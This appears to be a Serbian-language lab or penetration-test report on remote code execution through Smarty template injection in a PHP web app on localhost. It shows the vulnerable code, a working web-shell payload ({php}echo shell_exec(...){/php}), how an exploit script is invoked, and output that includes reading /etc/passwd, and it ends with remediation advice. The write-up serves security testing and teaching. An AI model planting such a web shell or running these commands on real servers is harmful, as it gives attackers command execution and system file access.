# Izveštaj — Remote Code Execution (RCE via SSTI)

## 1. Polazna tačka: statička analiza koda

Prvi korak bila je **statička analiza izvornog koda** alatom **Progpilot**, pokrenutim nad `app/` direktorijumom:

```bash
progpilot /workspace/app
```

Progpilot radi *taint* analizu — prati podatke pod kontrolom korisnika do opasnih funkcija. Pored XSS rezultata, analiza je skrenula pažnju na upotrebu **Smarty template engine-a** u `index.php`. Ručnom analizom potvrđeno je da se korisnički kontrolisan sadržaj (MotD poruka) prosleđuje direktno Smarty engine-u bez sanitizacije, što omogućava **Server-Side Template Injection (SSTI)**.

---

## 2. Opis ranjivosti

Aplikacija koristi **Smarty** template engine za prikazivanje *Message of the Day* (MotD) poruke. Administrator može da postavi MotD kroz `/admin/update_motd.php`, koji sadržaj direktno upisuje u `templates/motd.tpl`:

```php
$t_file = fopen("../templates/motd.tpl","w");
fwrite($t_file, $message);
fclose($t_file);
```

Kada korisnik poseti `index.php`, Smarty učitava i **kompajlira** taj template:

```php
$smarty = new Smarty();
$smarty->assign("username", $_SESSION['username']);
$smarty->force_compile = true;
echo $smarty->fetch("motd.tpl");
```

Smarty podržava `{php}...{/php}` tag koji dozvoljava izvršavanje proizvoljnog PHP koda unutar template-a. Pošto ne postoji nikakva validacija sadržaja MotD poruke, napadač koji ima pristup admin nalogu može da ubaci:

```smarty
{php}echo shell_exec($_GET['cmd']);{/php}
```

Ovim se u template ugrađuje PHP kod koji prima komandu kroz GET parametar `?cmd=` i vraća njen izlaz — efektivno **web shell**.

Dodatni uslov koji omogućava iskorišćavanje:

- **`force_compile = true`** — Smarty uvek rekompajlira template pri svakom zahtevu, što znači da se payload odmah aktivira bez čekanja na cache invalidaciju.

---

## 3. Implementirani exploit

Napisana je Python skripta koja automatizuje ceo lanac. Tok izvršavanja:

**Korak 1 — Admin sesija.** Skripta prima admin `PHPSESSID` kolačić dobijen u prethodnom koraku (Privilege Escalation via Stored XSS).

**Korak 2 — Ubacivanje SSTI payload-a.** POST zahtevom na `/admin/update_motd.php` postavlja se MotD na:

```smarty
{php}echo shell_exec($_GET['cmd']);{/php}
```

Aplikacija potvrđuje uspeh porukom `Message set!`.

**Korak 3 — Izvršavanje komande.** GET zahtevom na `/index.php?cmd=<komanda>` Smarty engine kompajlira template i izvršava PHP kod. Skripta parsira HTML odgovor i izvlači izlaz komande iz MotD sekcije stranice.

**Korak 4 — Interaktivni mod.** Skripta otvara interaktivnu konzolu za dalje izvršavanje komandi.

### Integracija sa exploit chain-om

Skripta prima `PHPSESSID` dobijen u prethodnom koraku:

```
login → user sesija → admin sesija (Stored XSS) → RCE (SSTI)
```

---

## 4. Rezultat

Primer pokretanja:

```bash
python rce_ssti.py http://localhost:8000 "PHPSESSID=ab17d293262c6601de82432b101fb284"
```

Dobijeni izlaz:

```
[*] Ubacujem SSTI payload u MotD...
[+] Payload ubacen!
[*] Izvrsavam komandu: id
[+] RCE uspešan!
==================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
==================================================
[*] Interaktivni mod (CTRL+C za izlaz):
$ whoami
www-data
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Napadač dobija mogućnost izvršavanja proizvoljnih komandi na serveru u kontekstu `www-data` korisnika.

---

## 5. Preporuke za otklanjanje

| Propust | Preporuka |
|---|---|
| `{php}` tag omogućen u Smarty | Onemogućiti `{php}` tag: `$smarty->php_handling = Smarty::PHP_REMOVE` |
| Nema validacije MotD sadržaja | Sanitizovati unos — dozvoliti samo plain text, bez template tagova |
| `force_compile = true` | Ukloniti u produkciji — ubrzava exploit jer nema cache-a |
| Admin funkcionalnost bez dodatne zaštite | Dodati CSRF zaštitu na admin forme |